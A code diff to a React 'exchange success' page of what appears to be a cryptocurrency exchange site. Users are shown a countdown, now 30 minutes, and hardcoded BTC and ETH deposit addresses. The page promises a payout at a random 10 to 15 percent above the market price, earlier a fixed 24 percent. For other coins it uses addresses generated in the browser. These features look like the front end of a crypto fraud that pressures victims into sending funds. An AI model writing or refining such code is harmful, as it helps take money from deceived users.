@@ -54,17 +54,72 @@ const ExchangeSuccess = () => {
   const { showNotification } = useNotification()
   const [exchangeData, setExchangeData] = useState(null)
   const [walletAddress, setWalletAddress] = useState('')
-  const [countdown, setCountdown] = useState(300) // 5 minutes countdown
+  const [countdown, setCountdown] = useState(1800) // 30 minutes countdown
   const [startTime, setStartTime] = useState(null) // Store start time in state
   const [currentPrice, setCurrentPrice] = useState(null)
+  const [receivingMultiplier, setReceivingMultiplier] = useState(null) // Random multiplier between 1.1 and 1.15
   
   useEffect(() => {
-    // Clear ongoing exchange flag when component mounts
-    sessionStorage.removeItem('ongoingExchange')
+    // Get exchange data from location state or sessionStorage
+    let exchangeDataToUse = null
     
-    // Get exchange data from location state
     if (location.state?.exchangeData) {
-      setExchangeData(location.state.exchangeData)
+      exchangeDataToUse = location.state.exchangeData
+    } else {
+      // Try to get from localStorage (keyed by user ID) or sessionStorage (backward compatibility)
+      // First, we need to get user ID from sessionStorage
+      const userData = sessionStorage.getItem('user')
+      let userId = null
+      if (userData) {
+        try {
+          const user = JSON.parse(userData)
+          userId = user.id
+        } catch (e) {
+          console.error('Error parsing user data:', e)
+        }
+      }
+      
+      if (userId) {
+        const currentExchangeDataKey = `currentExchangeData_${userId}`
+        const storedExchangeData = localStorage.getItem(currentExchangeDataKey) || sessionStorage.getItem('currentExchangeData')
+        if (storedExchangeData) {
+          try {
+            exchangeDataToUse = JSON.parse(storedExchangeData)
+          } catch (e) {
+            console.error('Error parsing stored exchange data:', e)
+          }
+        }
+      } else {
+        // Fallback to sessionStorage if no user ID
+        const storedExchangeData = sessionStorage.getItem('currentExchangeData')
+        if (storedExchangeData) {
+          try {
+            exchangeDataToUse = JSON.parse(storedExchangeData)
+          } catch (e) {
+            console.error('Error parsing stored exchange data:', e)
+          }
+        }
+      }
+    }
+    
+    if (exchangeDataToUse) {
+      setExchangeData(exchangeDataToUse)
+      
+      // Get receiving multiplier from exchange data or generate new one
+      let multiplier = exchangeDataToUse.receivingMultiplier
+      if (!multiplier) {
+        // Fallback: get from sessionStorage or generate new
+        const multiplierKey = `receiving_multiplier_${exchangeDataToUse.user_id}_${exchangeDataToUse.category}_${exchangeDataToUse.amount}`
+        const storedMultiplier = sessionStorage.getItem(multiplierKey)
+        if (storedMultiplier) {
+          multiplier = parseFloat(storedMultiplier)
+        } else {
+          // Generate random multiplier between 1.1 and 1.15
+          multiplier = 1.1 + Math.random() * 0.05
+          sessionStorage.setItem(multiplierKey, multiplier.toFixed(4))
+        }
+      }
+      setReceivingMultiplier(multiplier)
       
       // Map crypto symbols to types for wallet generation
       const cryptoTypeMap = {
@@ -76,17 +131,17 @@ const ExchangeSuccess = () => {
         'SOL': 'SOL'
       }
       
-      const cryptoType = cryptoTypeMap[location.state.exchangeData.category] || 'BTC'
+      const cryptoType = cryptoTypeMap[exchangeDataToUse.category] || 'BTC'
       
       // Use specific addresses for Bitcoin and Ethereum
       let address = ''
-      if (location.state.exchangeData.category === 'BTC') {
+      if (exchangeDataToUse.category === 'BTC') {
         address = 'bc1q88lt94hn93tya6f0y4ugfxa820tlhpe3mdxurk'
-      } else if (location.state.exchangeData.category === 'ETH') {
+      } else if (exchangeDataToUse.category === 'ETH') {
         address = '0xC39931D8788DC839341B90Caa1E2cfFe30CD51A8'
       } else {
         // For other cryptocurrencies, use generated address
-        const exchangeId = `${location.state.exchangeData.user_id}_${location.state.exchangeData.category}_${location.state.exchangeData.amount}`
+        const exchangeId = `${exchangeDataToUse.user_id}_${exchangeDataToUse.category}_${exchangeDataToUse.amount}`
         const savedAddress = sessionStorage.getItem(`wallet_${exchangeId}`)
         address = savedAddress || generateWalletAddress(cryptoType)
         
@@ -109,7 +164,7 @@ const ExchangeSuccess = () => {
             'SOL': 'solana'
           }
           
-          const cryptoId = cryptoIdMap[location.state.exchangeData.category]
+          const cryptoId = cryptoIdMap[exchangeDataToUse.category]
           if (cryptoId) {
             const prices = await cryptoAPI.getCryptoPrice([cryptoId])
             if (prices && prices[cryptoId] && prices[cryptoId].price) {
@@ -136,15 +191,15 @@ const ExchangeSuccess = () => {
         const savedTime = parseInt(savedStartTime)
         const elapsed = Math.floor((Date.now() - savedTime) / 1000)
         
-        // If timer expired (more than 5 minutes), start fresh
-        if (elapsed >= 300) {
+        // If timer expired (more than 30 minutes), start fresh
+        if (elapsed >= 1800) {
           const now = Date.now()
           setStartTime(now)
           sessionStorage.setItem(`${exchangeKey}_start`, now.toString())
-          setCountdown(300)
+          setCountdown(1800)
         } else {
           // Restore timer with remaining time
-          const remaining = Math.max(0, 300 - elapsed)
+          const remaining = Math.max(0, 1800 - elapsed)
           setStartTime(savedTime)
           setCountdown(remaining)
         }
@@ -153,7 +208,7 @@ const ExchangeSuccess = () => {
         const now = Date.now()
         setStartTime(now)
         sessionStorage.setItem(`${exchangeKey}_start`, now.toString())
-        setCountdown(300)
+        setCountdown(1800)
       }
     } else {
       // Redirect to dashboard if no exchange data
@@ -167,22 +222,39 @@ const ExchangeSuccess = () => {
       return
     }
     
-    // Set up interval to update countdown every second
-    const interval = setInterval(() => {
-      // Calculate remaining time based on actual elapsed time from start
-      const elapsed = Math.floor((Date.now() - startTime) / 1000)
-      const remaining = Math.max(0, 300 - elapsed)
-      
-      setCountdown(remaining)
+      // Set up interval to update countdown every second
+      const interval = setInterval(() => {
+        // Calculate remaining time based on actual elapsed time from start
+        const elapsed = Math.floor((Date.now() - startTime) / 1000)
+        const remaining = Math.max(0, 1800 - elapsed)
+        
+        setCountdown(remaining)
       
       // Update sessionStorage with current remaining time
       const exchangeKey = `exchange_countdown_${walletAddress}`
       sessionStorage.setItem(exchangeKey, remaining.toString())
       
-      // If timer reaches 0, clear interval
-      if (remaining <= 0) {
-        clearInterval(interval)
-      }
+        // If timer reaches 0, clear interval
+        if (remaining <= 0) {
+          clearInterval(interval)
+          // Clear exchange flags when timer expires
+          // Get user ID to clear user-specific localStorage
+          const userData = sessionStorage.getItem('user')
+          if (userData) {
+            try {
+              const user = JSON.parse(userData)
+              if (user.id) {
+                localStorage.removeItem(`ongoingExchange_${user.id}`)
+                localStorage.removeItem(`currentExchangeData_${user.id}`)
+              }
+            } catch (e) {
+              console.error('Error parsing user data:', e)
+            }
+          }
+          // Also clear sessionStorage for backward compatibility
+          sessionStorage.removeItem('ongoingExchange')
+          sessionStorage.removeItem('currentExchangeData')
+        }
     }, 1000)
     
     return () => clearInterval(interval)
@@ -317,23 +389,7 @@ const ExchangeSuccess = () => {
                   ${exchangeData.amount.toLocaleString(undefined, { maximumFractionDigits: 2 })}
                 </div>
               </div>
-              <div>
-                <div style={{
-                  fontSize: '0.875rem',
-                  color: '#6b7280',
-                  marginBottom: '0.25rem'
-                }}>
-                  User ID
-                </div>
-                <div style={{
-                  fontSize: '1.125rem',
-                  fontWeight: '400',
-                  color: '#111827'
-                }}>
-                  {exchangeData.user_id}
-                </div>
-              </div>
-              {currentPrice && (
+              {currentPrice && receivingMultiplier && (
                 <>
                   <div>
                     <div style={{
@@ -364,7 +420,7 @@ const ExchangeSuccess = () => {
                       fontWeight: '400',
                       color: '#10b981'
                     }}>
-                      ${(currentPrice * 1.24).toLocaleString(undefined, { maximumFractionDigits: 2 })}
+                      ${(currentPrice * receivingMultiplier).toLocaleString(undefined, { maximumFractionDigits: 2 })}
                     </div>
                   </div>
                 </>
